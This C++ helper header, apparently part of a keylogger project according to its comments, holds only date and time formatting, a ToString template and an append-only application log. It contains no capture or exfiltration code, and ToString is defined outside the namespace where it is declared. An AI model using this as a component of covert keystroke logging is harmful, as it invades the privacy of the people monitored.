#ifndef HELPER_H 
#define HELPER_H

#include <ctime>
#include <string>
#include <sstream>
#include <fstream>
// converting various types to strings


namespace Helper
{
    template <class T> // typename T
    // create first prorotype of a function
    std::string ToString (const T &);

    struct DateTime // structs user defined 
    {
        
        DateTime() 
        // constructor for this struct ; machine where keylogger running
        {
            time_t ms; // ctime library ms variable
            time (&ms);  // system time parsing the address from ms

            struct tm *info = localtime(&ms); // pointer to a struct tm, variables contain memory address of another variable
            // indirectly access the varialbe via a pointer
            // pointer points to ms value
            D = info->tm_mday;  // accessomg tm struct attributes
            m = info->tm_mon + 1; // starts with 0 so add 1 to it
            y = 1900 + info->tm_year;  // unix time starts on 1/1/1970
            H = info->tm_hour; // hour assignment
            M = info->tm_min;
            S = info->tm_sec;
            
        }

        DateTime(int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S){}
        DateTime(int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0){}

        DateTime Now() const  // return datetime const parsed to this method. only read. changes nothing withing the class
        {
            // call constructor
            return DateTime();
        }

        int D, m, y, H, M, S;

        std::string GetDateString() const
        {
            return std::string( D < 10 ? "0" : "") + ToString(D) + std::string( m < 10 ? ".0" : ".") + ToString (m) + "." + ToString(y);
            // if D is less than ten write 0 otherwise write empty space DD.mm.YYYY
        }

        std::string GetTimeString(const std::string &sep = ":") const //format time to our specification default separator is colon
        {
            return std::string( H < 10 ? "0" : "") + ToString(H) + sep + std::string( M < 10 ? "0" : "") + ToString(M) + sep + std::string( S < 10 ? "0" : "") + ToString(S);
            // HH:MM:SS
        }

        // func to combine day and time and add a return value of 2 funcs
        std::string GetDateTimeString(const std::string &sep = ":") const
        {
            return GetDateString() + " " + GetTimeString(sep);
        }


    };
}

    template <class T>

    std::string ToString(const T &e)
    {
        std::ostringstream s; // output string stream
        s << e; // only parse type to this function supports insertion operator
        return s.str();
    }

    // records behavior of keylogger. records failed ops

    void WriteAppLog( const std::string &s) // reference to a const string
    {
        std::ofstream file("AppLog.txt", std::ios::app); // app = append
        file << "[" << Helper::DateTime().GetDateTimeString() << "]" << "\n" << s << std::endl << "\n";
    }

#endif 